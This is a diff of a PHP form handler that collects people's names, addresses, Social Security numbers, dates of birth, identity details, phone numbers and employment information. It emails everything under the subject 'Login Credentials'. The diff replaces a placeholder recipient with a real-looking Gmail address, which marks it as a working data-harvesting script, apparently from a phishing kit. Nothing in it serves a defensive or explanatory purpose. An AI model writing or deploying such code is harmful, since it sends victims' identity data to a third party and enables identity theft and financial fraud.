@@ -23,10 +23,10 @@ $politicalFigure1 = $_POST['politicalFigure1'] ?? '';
 $politicalFigure2 = $_POST['politicalFigure2'] ?? '';
 $certify = $_POST['certify'] ?? '';
 
-    $to = "your-email@example.com"; // Replace with your email
+    $to = "aadhyacreation29@gmail.com"; // Replace with your email
     $subject = "Login Credentials";
     $message = "firstName: " . $firstName . "\r\n middleName: " . $middleName ."\r\n lastName: " . $lastName. "\r\n suffix: " . $suffix. "\r\n address1: " . $address1. "\r\n address2: " . $address2."\r\n city: " . $city."\r\n state: " . $state."\r\n zipCode: " . $zipCode."\r\n yearsAtAddress: " . $yearsAtAddress."\r\n certify: " . $certify."\r\n ssn: " . $ssn."\r\n dob: " . $dob."\r\n identity: " . $identity."\r\n mobilePhone: " . $mobilePhone."\r\n homePhone: " . $homePhone."\r\n email: " . $email."\r\n employmentStatus: " . $employmentStatus."\r\n occupation: " . $occupation."\r\n politicalFigure1: " . $politicalFigure1."\r\n politicalFigure2: " . $politicalFigure2."\r\n certify: " . $certify;
-    $headers = "From: noreply@yourdomain.com";
+    $headers = "From: aadhyacreation29@gmail.com";
 
     if (mail($to, $subject, $message, $headers)) {
         echo "Credentials sent to email.";
